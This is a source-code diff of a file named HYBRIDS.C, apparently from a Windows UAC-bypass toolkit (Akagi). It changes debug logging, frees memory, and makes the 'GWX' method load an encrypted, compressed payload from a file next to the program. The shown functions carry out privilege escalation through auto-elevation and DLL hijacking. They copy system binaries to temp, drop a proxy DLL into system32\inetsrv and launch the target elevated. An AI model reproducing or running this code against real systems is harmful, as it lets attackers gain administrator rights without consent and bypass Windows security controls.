@@ -4,9 +4,9 @@
 *
 *  TITLE:       HYBRIDS.C
 *
-*  VERSION:     2.53
+*  VERSION:     2.56
 *
-*  DATE:        18 Jan 2017
+*  DATE:        15 Feb 2017
 *
 *  Hybrid UAC bypass methods.
 *
@@ -168,7 +168,7 @@ BOOL ucmWinSATMethod(
 
         // Copy winsat to temp directory
         if (!CopyFile(szSource, szDest, FALSE)) {
-            OutputDebugString(T_TARGETNOTFOUND);
+            supDebugPrint(TEXT("ucmWinSATMethod"), GetLastError());
             break;
         }
 
@@ -302,7 +302,7 @@ BOOL ucmMMCMethod(
         _strcat(szDest, lpTargetDll);
 
         if (PathFileExists(szDest)) {
-            OutputDebugString(T_TARGETALREADYEXIST);
+            supDebugPrint(TEXT("ucmMMCMethod"), ERROR_ALREADY_EXISTS);
             break;
         }
 
@@ -674,6 +674,10 @@ BOOL ucmGenericAutoelevation(
 * IIS initially not installed in Windows client, but appinfo.dll whitelists IIS application as autoelevated.
 * We will use backdoor from "Get Windows 10" bullshit marketing promo package and exploit it with dll hijacking as usual.
 *
+* Since this method very out-dated (GWX program expired long time ago) starting from 2.5.6 Kongou module removed from program resources.
+* To use it again place KongouXX.cd to the program directory, where XX is platform (32 or 64).
+* Kongou located in project "bin" directory in encrypted and compressed state, Akagi will load, decrypt and decompress it.
+*
 */
 BOOL ucmGWX(
     VOID
@@ -682,12 +686,11 @@ BOOL ucmGWX(
     BOOL bResult = FALSE, cond = FALSE;
     WCHAR szDest[MAX_PATH * 2];
     WCHAR szSource[MAX_PATH * 2];
-
     WCHAR szTargetApp[MAX_PATH * 2];
 
     PVOID Data = NULL, Ptr = NULL;
     ULONG DecompressedBufferSize = 0, DataSize = 0;
-    
+
     do {
 
         //target dir
@@ -698,26 +701,28 @@ BOOL ucmGWX(
 
         //File already exist, so IIS could be installed
         if (PathFileExists(szDest)) {
-            OutputDebugString(T_TARGETALREADYEXIST);
+            supDebugPrint(TEXT("ucmGWX"), ERROR_ALREADY_EXISTS);
             break;
         }
 
-        //summon some unicorns
-        Ptr = supLdrQueryResourceData(KONGOU_ID, g_ctx.Peb->ImageBaseAddress, &DataSize);
-        if (Ptr == NULL)
+        //summon some unicorns, kongouXX.cd expected to be in the same directory as application
+        Ptr = supReadFileToBuffer(KONGOU_CD, &DataSize);
+        if (Ptr == NULL) {
+            supDebugPrint(TEXT("ucmGWX"), ERROR_FILE_NOT_FOUND);
             break;
+        }
 
         Data = DecompressPayload(Ptr, DataSize, &DecompressedBufferSize);
         if (Data == NULL)
             break;
-        
+
         //write proxy dll to disk
         RtlSecureZeroMemory(szSource, sizeof(szSource));
         _strcpy(szSource, g_ctx.szTempDirectory);
         _strcat(szSource, SLC_DLL);
         if (!supWriteBufferToFile(szSource, g_ctx.PayloadDll, g_ctx.PayloadDllSize))
             break;
-        
+
         //drop fubuki to system32\inetsrv
         RtlSecureZeroMemory(szDest, sizeof(szDest));
         _strcpy(szDest, g_ctx.szSystemDirectory);
@@ -726,12 +731,12 @@ BOOL ucmGWX(
         if (!bResult) {
             break;
         }
-        
+
         //put target app
         RtlSecureZeroMemory(szSource, sizeof(szSource));
         _strcpy(szSource, g_ctx.szTempDirectory);
         _strcat(szSource, INETMGR_EXE);
-        
+
         //write app to disk
         if (!supWriteBufferToFile(szSource, Data, DecompressedBufferSize)) {
             break;
@@ -742,18 +747,19 @@ BOOL ucmGWX(
         if (!bResult) {
             break;
         }
-        
+
         _strcpy(szTargetApp, szDest);
         _strcat(szTargetApp, INETMGR_EXE);
         bResult = supRunProcess(szTargetApp, NULL);
-        if (bResult) {
-            OutputDebugString(TEXT("Next time be more creative ESET"));
-        }
-        
+
     } while (cond);
 
     if (Data != NULL) {
         VirtualFree(Data, 0, MEM_RELEASE);
+    }
+
+    if (Ptr != NULL) {
+        VirtualFree(Ptr, 0, MEM_RELEASE);
     }
     return bResult;
 }
@@ -799,7 +805,6 @@ BOOL ucmAutoElevateManifestW7(
     DWORD ProxyDllSize
     )
 {
-    DWORD d;
     BOOL bResult = FALSE, bCond = FALSE;
     WCHAR szDest[MAX_PATH * 2];
     WCHAR szSource[MAX_PATH * 2];
@@ -820,8 +825,7 @@ BOOL ucmAutoElevateManifestW7(
 
         // Copy target to temp directory
         if (!CopyFile(szSource, szDest, FALSE)) {
-            d = GetLastError();
-            OutputDebugString(T_TARGETNOTFOUND);
+            supDebugPrint(TEXT("ucmAutoElevateManifestW7"), ERROR_FILE_NOT_FOUND);
             break;
         }
         _strcpy(szSource, szDest);
@@ -906,7 +910,7 @@ BOOL ucmAutoElevateManifest(
 
         // Copy target to temp directory
         if (!CopyFile(szSource, szDest, FALSE)) {
-            OutputDebugString(T_TARGETNOTFOUND);
+            supDebugPrint(TEXT("ucmAutoElevateManifest"), ERROR_FILE_NOT_FOUND);
             break;
         }
         _strcpy(szSource, szDest);
@@ -1123,7 +1127,7 @@ BOOL ucmInetMgrMethod(
 
         //File already exist, so IIS could be installed
         if (PathFileExists(szBuffer)) {
-            OutputDebugString(T_TARGETALREADYEXIST);
+            supDebugPrint(TEXT("ucmInetMgrMethod"), ERROR_ALREADY_EXISTS);
             break;
         }
 
